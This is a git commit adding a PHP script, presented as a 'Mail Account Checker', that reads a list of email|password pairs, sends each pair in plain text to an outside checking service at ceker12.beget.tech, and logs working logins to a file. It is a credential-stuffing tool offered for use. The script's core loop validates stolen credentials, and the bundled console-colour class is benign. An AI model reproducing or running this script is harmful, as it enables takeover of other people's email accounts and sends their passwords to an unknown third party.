4549561c5317a723adfb3000de9d2f6e3a673bef
dowerarts <56032033+dowerarts@users.noreply.github.com>
2020-04-08 12:05:36 +0700

    Mail Account Checker

---
+++ cekermail.php
@@ -0,0 +1,174 @@
+<?php
+
+function curl($url,$post,$headers)
+{
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_HEADER, 1);
+	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+	if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+	$result = curl_exec($ch);
+	// $header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
+	$cookies = array();
+	foreach($matches[1] as $item) {
+	  parse_str($item, $cookie);
+	  $cookies = array_merge($cookies, $cookie);
+	}
+	return array (
+	$headers,
+	$body,
+	$cookies
+	);
+}
+
+$headers = array();
+$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36';;
+$headers[] = 'Content-Type: text/html';
+
+Console::log(" __  __       _ _                                   _    _____ _               _             
+|  \/  |     (_) |   /\                            | |  / ____| |             | |            
+| \  / | __ _ _| |  /  \   ___ ___ ___  _   _ _ __ | |_| |    | |__   ___  ___| | _____ _ __ 
+| |\/| |/ _` | | | / /\ \ / __/ __/ _ \| | | | '_ \| __| |    | '_ \ / _ \/ __| |/ / _ \ '__|
+| |  | | (_| | | |/ ____ \ (_| (_| (_) | |_| | | | | |_| |____| | | |  __/ (__|   <  __/ |   
+|_|  |_|\__,_|_|_/_/    \_\___\___\___/ \__,_|_| |_|\__|\_____|_| |_|\___|\___|_|\_\___|_|   ", 'red');
+console::log("By Apri Amsyah x Dito Firmansyah", 'green');
+echo "\n";
+console::log("List Email :", 'green');
+$xyz = trim(fgets(STDIN));
+echo "\n";
+foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
+ 	$pecah = explode("|", trim($akun));
+	$mail = trim($pecah[0]);
+	$passwd = trim($pecah[1]);
+
+$gas = curl('http://ceker12.beget.tech/EAC/check.php?do=check&mailpass='.$mail.'|'.$passwd.'&delim=|', null, $headers);
+	if (strpos($gas[1], 'DIE')) {
+		console::log("[Gagal] | $mail|$passwd", 'red');
+	} if (strpos($gas[1], 'LIVE')) {
+		console::log("[Success Login] | $mail|$passwd", 'green');
+		fwrite(fopen("acc-live.txt", "a"), "[Success Login] | $mail|$passwd \n");		
+		}
+}
+/**
+ * PHP Colored CLI
+ * Used to log strings with custom colors to console using php
+ * 
+ * Copyright (C) 2013 Sallar Kaboli <sallar.kaboli@gmail.com>
+ * MIT Liencesed
+ * http://opensource.org/licenses/MIT
+ *
+ * Original colored CLI output script:
+ * (C) Jesse Donat https://github.com/donatj
+ */
+class Console {
+ 
+    static $foreground_colors = array(
+        'bold'         => '1',    'dim'          => '2',
+        'black'        => '0;30', 'dark_gray'    => '1;30',
+        'blue'         => '0;34', 'light_blue'   => '1;34',
+        'green'        => '0;32', 'light_green'  => '1;32',
+        'cyan'         => '0;36', 'light_cyan'   => '1;36',
+        'red'          => '0;31', 'light_red'    => '1;31',
+        'purple'       => '0;35', 'light_purple' => '1;35',
+        'brown'        => '0;33', 'yellow'       => '1;33',
+        'light_gray'   => '0;37', 'white'        => '1;37',
+        'normal'       => '0;39',
+    );
+    
+    static $background_colors = array(
+        'black'        => '40',   'red'          => '41',
+        'green'        => '42',   'yellow'       => '43',
+        'blue'         => '44',   'magenta'      => '45',
+        'cyan'         => '46',   'light_gray'   => '47',
+    );
+ 
+    static $options = array(
+        'underline'    => '4',    'blink'         => '5', 
+        'reverse'      => '7',    'hidden'        => '8',
+    );
+
+    static $EOF = "\n";
+
+    /**
+     * Logs a string to console.
+     * @param  string  $str        Input String
+     * @param  string  $color      Text Color
+     * @param  boolean $newline    Append EOF?
+     * @param  [type]  $background Background Color
+     * @return [type]              Formatted output
+     */
+    public static function log($str = '', $color = 'normal', $newline = true, $background_color = null)
+    {
+        if( is_bool($color) )
+        {
+            $newline = $color;
+            $color   = 'normal';
+        }
+        elseif( is_string($color) && is_string($newline) )
+        {
+            $background_color = $newline;
+            $newline          = true;
+        }
+        $str = $newline ? $str . self::$EOF : $str;
+
+        echo self::$color($str, $background_color);
+    }
+    
+    /**
+     * Anything below this point (and its related variables):
+     * Colored CLI Output is: (C) Jesse Donat
+     * https://gist.github.com/donatj/1315354
+     * -------------------------------------------------------------
+     */
+    
+    /**
+     * Catches static calls (Wildcard)
+     * @param  string $foreground_color Text Color
+     * @param  array  $args             Options
+     * @return string                   Colored string
+     */
+    public static function __callStatic($foreground_color, $args)
+    {
+        $string         = $args[0];
+        $colored_string = "";
+ 
+        // Check if given foreground color found
+        if( isset(self::$foreground_colors[$foreground_color]) ) {
+            $colored_string .= "\033[" . self::$foreground_colors[$foreground_color] . "m";
+        }
+        else{
+            die( $foreground_color . ' not a valid color');
+        }
+        
+        array_shift($args);
+
+        foreach( $args as $option ){
+            // Check if given background color found
+            if(isset(self::$background_colors[$option])) {
+                $colored_string .= "\033[" . self::$background_colors[$option] . "m";
+            }
+            elseif(isset(self::$options[$option])) {
+                $colored_string .= "\033[" . self::$options[$option] . "m";
+            }
+        }
+        
+        // Add string and end coloring
+        $colored_string .= $string . "\033[0m";
+        
+        return $colored_string;
+        
+    }
+ 
+    /**
+     * Plays a bell sound in console (if available)
+     * @param  integer $count Bell play count
+     * @return string         Bell play string
+     */
+    public static function bell($count = 1) {
+        echo str_repeat("\007", $count);
+    }
+ 
+}
